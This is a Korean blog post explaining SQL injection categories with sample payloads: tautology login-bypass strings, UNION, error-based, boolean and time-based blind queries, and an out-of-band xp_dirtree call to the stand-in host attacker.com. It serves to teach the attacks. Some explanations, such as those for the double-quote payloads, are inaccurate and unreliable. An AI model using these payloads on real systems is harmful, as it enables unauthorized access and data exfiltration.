---
layout: single
title:  "SQLInjection 이론 02" 
---

SQL Injection은 여러 가지 방식으로 분류될 수 있으며, 각각의 공격 방식은 다른 취약점을 악용합니다.

### 1. Classic SQL Injection

**Classic SQL Injection**은 가장 기본적인 형태의 SQL Injection으로, 입력값을 조작하여 SQL 쿼리의 논리 구조를 변경하고 이를 통해 데이터베이스에 접근하거나 조작하는 방법입니다.

```
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='password';
```

이 쿼리는 항상 참인 조건(`'1'='1'`)을 이용하여 로그인 절차를 우회합니다.

```
'or 'x'='x
"or "x"="x
') or ('x'='x
")or ("x"="x
```

이들 공격의 공통점은 항상 참인 조건(`'x'='x` 또는 `"x"="x`)을 삽입하여 SQL 쿼리의 결과를 조작하는 것입니다. 이제 각각의 공격을 살펴보겠습니다:

#### 1. `'or 'x'='x`

- **공격자가 입력한 값**:
  
  - `username`: `' or 'x'='x`
  - `password`: (아무 값이나 상관없음)
    
    

```
SELECT * FROM users WHERE username='' or 'x'='x' AND password='password';
```

**해석**:

- `username=''`: 아이디가 빈 문자열인 사용자.
- `or 'x'='x'`: 항상 참인 조건.
- 이로 인해 쿼리는 항상 참이 되어 모든 레코드를 반환합니다.
  
  

#### 2. `"or "x"="x`

- **공격자가 입력한 값**:
  
  - `username`: `" or "x"="x`
  - `password`: (아무 값이나 상관없음)

```
SELECT * FROM users WHERE username='" or "x"="x' AND password='password';
```

**해석**:

- `username='"`: 아이디가 따옴표로 시작.
- `or "x"="x"`: 항상 참인 조건.
- 이로 인해 쿼리는 항상 참이 되어 모든 레코드를 반환합니다.

#### 3. `') or ('x'='x`

- **공격자가 입력한 값**:
  
  - `username`: `') or ('x'='x`
  - `password`: (아무 값이나 상관없음)

```
SELECT * FROM users WHERE username='') or ('x'='x' AND password='password';
```

**해석**:

- `username=''`: 아이디가 빈 문자열인 사용자.
- `or ('x'='x')`: 항상 참인 조건.
- 이로 인해 쿼리는 항상 참이 되어 모든 레코드를 반환합니다.

#### 4. `")or ("x"="x`

- **공격자가 입력한 값**:
  
  - `username`: `")or ("x"="x`
  - `password`: (아무 값이나 상관없음)

```
SELECT * FROM users WHERE username='")or ("x"="x' AND password='password';
```

**해석**:

- `username='"`: 아이디가 따옴표로 시작.
- `or ("x"="x")`: 항상 참인 조건.
- 이로 인해 쿼리는 항상 참이 되어 모든 레코드를 반환합니다.

### Classic SQL Injection의 특징

- **논리 조건 조작**: 입력값을 통해 쿼리의 논리 구조를 변경하여 항상 참인 조건을 만듭니다.
- **쿼리 결과 조작**: 이를 통해 데이터베이스의 인증 절차를 우회하거나 모든 데이터를 반환하게 만듭니다.
- **쉽게 탐지 가능**: 이런 공격은 논리 조건을 추가하는 것이므로, 보안 조치가 취해지지 않은 시스템에서 쉽게 탐지할 수 있습니다.



### 2. Union Based SQL Injection

**Union Based SQL Injection**은 `UNION` SQL 연산자를 사용하여 두 개의 쿼리 결과를 결합하는 방법입니다. 이를 통해 공격자는 두 개 이상의 테이블 데이터를 하나의 결과로 반환하게 만듭니다.

```
SELECT name, email FROM users WHERE id=1 UNION SELECT username, password FROM admin;
```

이 쿼리는 두 테이블(users와 admin)의 결과를 결합하여 반환합니다.



### 3. Error Based SQL Injection

**Error Based SQL Injection**은 데이터베이스가 반환하는 에러 메시지를 이용하여 정보를 추출하는 방법입니다. 공격자는 의도적으로 쿼리에 오류를 발생시켜 데이터베이스가 에러 메시지를 반환하게 하고, 이를 통해 데이터베이스의 구조나 정보를 알아냅니다.

```
SELECT * FROM users WHERE id=1 AND (SELECT 1 FROM non_existent_table);
```

이 쿼리는 존재하지 않는 테이블을 참조하여 에러를 발생시킵니다.



### 4. Blind SQL Injection

**Blind SQL Injection**은 데이터베이스가 에러 메시지를 반환하지 않는 경우, 참(True) 또는 거짓(False) 조건에 따라 응답이 달라지는 것을 통해 정보를 추출하는 방법입니다.

#### 두 가지 하위 유형

**Boolean Based Blind SQL Injection**: 참 또는 거짓에 따라 응답의 차이를 관찰하는 방법.

```
SELECT * FROM users WHERE id=1 AND 1=1;
SELECT * FROM users WHERE id=1 AND 1=2;
```

첫 번째 쿼리는 참이므로 정상적으로 데이터를 반환하고, 두 번째 쿼리는 거짓이므로 데이터를 반환하지 않습니다.

**Time Based Blind SQL Injection**: 데이터베이스 쿼리에 지연 함수를 사용하여 참(True) 또는 거짓(False) 조건에 따라 응답 시간을 다르게 만들어 정보를 추출하는 방법.

```
SELECT * FROM users WHERE id=1 AND IF(1=1, SLEEP(5), 0);
SELECT * FROM users WHERE id=1 AND IF(1=2, SLEEP(5), 0);
```

첫 번째 쿼리는 참이므로 5초 지연 후 응답하고, 두 번째 쿼리는 거짓이므로 즉시 응답합니다.



### 5. Time Based SQL Injection

**Time Based SQL Injection**은 Blind SQL Injection의 한 유형으로, 쿼리 실행 시간을 이용하여 정보를 추출하는 방법입니다. 이는 응답 시간의 변화를 통해 데이터를 추출하는 방법입니다.

```
SELECT * FROM users WHERE id=1 AND IF(1=1, SLEEP(5), 0);
```

참일 경우 5초 동안 지연되며, 이를 통해 참과 거짓을 구분합니다.

```
SELECT * FROM users WHERE id = 1 AND IF(1=2, SLEEP(5), 0);
```

쿼리의 조건이 거짓이라면, 지연 없이 즉시 응답이 돌아옵니다. 이를 통해 공격자는 조건이 거짓인 경우를 알아낼 수 있습니다.



### 6. Out-of-Band SQL Injection

**Out-of-Band SQL Injection**은 데이터베이스가 에러 메시지나 응답 시간을 통해 직접적인 피드백을 주지 않는 경우, 데이터베이스가 외부 서버로 데이터를 전송하도록 하여 정보를 추출하는 방법입니다.

```
SELECT * FROM users; EXEC master..xp_dirtree '\\attacker.com\folder';
```

이 쿼리는 데이터베이스 서버가 외부 서버로 요청을 보내도록 하여 공격자가 정보를 수집할 수 있게 합니다.
